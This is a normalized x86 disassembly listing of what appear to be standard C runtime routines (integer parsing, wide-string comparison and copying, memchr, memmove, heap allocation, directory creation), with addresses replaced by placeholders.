jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop ebx
leave
retn
movzx esi [ edi ]
inc edi
inc edi
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
movzx esi [ edi ]
inc edi
inc edi
cmp [ ebp + 0x14 ] 0x10
jne r-xdata
push esi
call sub_44a0a3
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_44a0a3
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
cmp ax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
dec edi
test al 0x8
jne r-xdata
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
inc edi
inc edi
movzx esi [ edi ]
inc edi
inc edi
cmp ax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x14 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_443b37
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_44a0a3
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
inc edi
inc edi
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4416d6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_4414dc
add esp 0x14
pop ebp
retn
sub_441701
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_4472e1
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_4472e1
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_4417eb
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441701
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_441891
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_4418b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
inc eax
inc eax
xor eax eax
sub_4418d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_446068
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_446068
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_4419ce
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi esi
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] esi
ja r-xdata
pop esi
pop ebp
retn
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push sub_44a35a
call sub_4418d6
add esp 0x18
cmp eax esi
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ edi ] cx
pop edi
call sub_443b37
mov [ eax ] 0x22
sub_441a76
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_441ae9
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_443b5d
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_441b1b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp esi edi
je r-xdata
cmp esi edi
jne r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
cmp [ ebp + 0xc ] edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx edi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
dec ebx
je r-xdata
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] ax
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ esi + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_441bee
push 0xc
push r--data
call sub_4433dc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_443421
retn
push 0x4
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4490f8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_441c34
sub_441c3d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_443b8f
pop ecx
call sub_443b37
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_44b0a5
push 0x1e
call sub_44aefa
push 0xff
call sub_445b21
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_441bee
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_443b37
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_443b8f
pop ecx
test eax eax
je r-xdata
call sub_443b37
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_441d07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
movzx edx cx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
inc edi
inc edi
movzx edx [ edi ]
inc eax
inc eax
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
movzx edx dx
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
inc ecx
inc ecx
cmp [ eax + ecx ] bx
jne r-xdata
sub_441d68
push 0x10
push r--data
call sub_4433dc
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_441db5
call sub_443421
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_441dcd
push 0x14
push r--data
call sub_4433dc
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_443421
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_441e2b
push 0xc
push r--data
call sub_4433dc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_441e76
call sub_443421
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_441e90
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_441f3d
push [ rw-data ]
call sub_445378
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_44aefa
push 0x1
push 0x0
call sub_44b28a
add esp 0xc
jmp sub_44b173
call eax
sub_441f70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_441ff8 ]
jmp [ ecx * 4 + jump_table_442078 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4420e4 ]
pop esi
pop edi
pop ebp
jmp sub_44b341
jmp [ ecx * 4 + jump_table_442280 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_442184 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_442280 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4420e4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_442280 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4420e4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4420e4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4420e4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_442280 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_442280 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_442280 ]
sub_4422d5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_446068
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_4423a1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
call sub_443b37
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi [ ebp + 0x10 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push edi
push esi
push r-xdata
mov [ ebp - 0x4 ] eax
call sub_4422d5
add esp 0x18
mov [ esi + edi - 0x1 ] bl
cmp eax 0xfffffffe
jne r-xdata
mov edi [ eax ]
mov eax [ ebp + 0x10 ]
inc eax
push eax
push esi
push r-xdata
call sub_4422d5
add esp 0x18
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
cmp eax ebx
jge r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_443b37
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] bl
cmp eax 0xfffffffe
jne r-xdata
call sub_443b37
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_443b37
mov [ eax ] edi
jmp r-xdata
call sub_443b37
mov [ eax ] 0x22
call sub_443b37
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
sub_4424a8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4423a1
add esp 0x18
pop ebp
retn
sub_4424c8
push 0xc
push r--data
call sub_4433dc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_443def
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_443421
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_444560
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4425da
mov eax [ ebp - 0x1c ]
push ebx
call sub_44cc32
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_44b4ca
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_44ccce
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_4425e4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
